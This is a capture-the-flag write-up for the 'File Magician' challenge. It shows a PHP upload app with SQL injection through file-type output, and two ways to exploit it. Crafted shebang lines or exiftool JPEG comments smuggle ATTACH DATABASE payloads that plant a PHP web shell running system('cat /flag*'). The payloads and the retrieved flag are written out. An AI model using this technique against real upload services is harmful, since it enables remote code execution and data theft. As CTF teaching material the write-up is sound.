# File Magician
```
Finally (again), a minimalistic, open-source file hosting solution.
Connection: http://78.47.152.131:8000/
```

## index.php
```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
session_start();

if( ! isset($_SESSION['id'])) {
    $_SESSION['id'] = bin2hex(random_bytes(32));
}

$d = '/var/www/html/files/'.$_SESSION['id'] . '/';
@mkdir($d, 0700, TRUE);
chdir($d) || die('chdir');

$db = new PDO('sqlite:' . $d . 'db.sqlite3');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec('CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);');

if (isset($_FILES['file']) && $_FILES['file']['size'] < 10*1024 ){
    $s = "INSERT INTO upload(info) VALUES ('" .(new finfo)->file($_FILES['file']['tmp_name']). " ');";
    $db->exec($s);
    move_uploaded_file( $_FILES['file']['tmp_name'], $d . $db->lastInsertId()) || die('move_upload_file');
}

$uploads = [];
$sql = 'SELECT * FROM upload';
foreach ($db->query($sql) as $row) {
    $uploads[] = [$row['id'], $row['info']];
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>file magician</title>
</head>
<form enctype="multipart/form-data" method="post">
    <input type="file" name="file">
    <input type="submit" value="upload">
</form>
<table>
    <?php foreach($uploads as $upload):?>
        <tr>
            <td><a href="<?= '/files/' . $_SESSION['id'] . '/' . $upload[0] ?>"><?= $upload[0] ?></a></td>
            <td><?= $upload[1] ?></td>
        </tr>
    <?php endforeach?>
</table>
```

After review the code, we see that the only way to inject SQL is using this line:
```php
$s = "INSERT INTO upload(info) VALUES ('" .(new finfo)->file($_FILES['file']['tmp_name']). " ');";
```
We need to set a malicious **finfo** in order to inject SQL.

## Method 1
First I uploaded some random scripts (php, sh and python).
![alt text](img/1.png)

The key is in the python script. `file` command shows the first line of the file:
```python
#!/bin/usr/env python
print "Hello World!"
```

So now we can manage the output of `file` command.
To exploit this we need a database file with PHP extension to execute `system("cat /flag*");`. And create a TABLE to store the flag.
```sql
#!/');ATTACH DATABASE './d.php' AS db;CREATE TABLE db.m(f BLOB);--
```
The next step is inserting in that table our executable:
```sql
#!/');ATTACH DATABASE './d.php' AS db;INSERT INTO db.m VALUES ('<?php system("cat /flag*");?>');--
```

We save the payloads in **file_1** and **file_2**.
```bash
» cat file_1 file_2
#!/');ATTACH DATABASE './d.php' AS db;CREATE TABLE db.m(f BLOB);--
#!/');ATTACH DATABASE './d.php' AS db;INSERT INTO db.m VALUES ('<?php system("cat /flag*");?>');--
```
Now we only have to upload the files and download our **d.php.**

```bash
 » wget http://78.47.152.131:8000/files/24efbd24c81eeb75cfddc071e2b45423de3bb02d1b7aab020551aa95870d6b83/d.php -q
 » cat d.php
Ghxp{I should have listened to my mum about not trusting files about files}%
```
**Flag: hxp{I should have listened to my mum about not trusting files about files}**

## Method 2
The method to solve this challenge is using **exiftool** with a JPG:
```bash
» wget -q https://upload.wikimedia.org/wikipedia/en/4/48/Blank.JPG -O img_1.jpg
» cp img_1.jpg img_2.jpg
» exiftool -comment="');ATTACH DATABASE './d.php' AS db;CREATE TABLE db.m(f BLOB);--" img_1.jpg
» exiftool -comment="');ATTACH DATABASE './d.php' AS db;INSERT INTO db.m VALUES ('<?php system(\"cat /flag\*\");?>');--" img_2.jpg
» file img*
img_1.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "');ATTACH DATABASE './d.php' AS db;CREATE TABLE db.m(f BLOB);--", baseline, precision 8, 1x1, components 3
img_2.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "');ATTACH DATABASE './d.php' AS db;INSERT INTO db.m VALUES ('<?php system("cat /flag\*");?>');", baseline, precision 8, 1x1, components 3
```
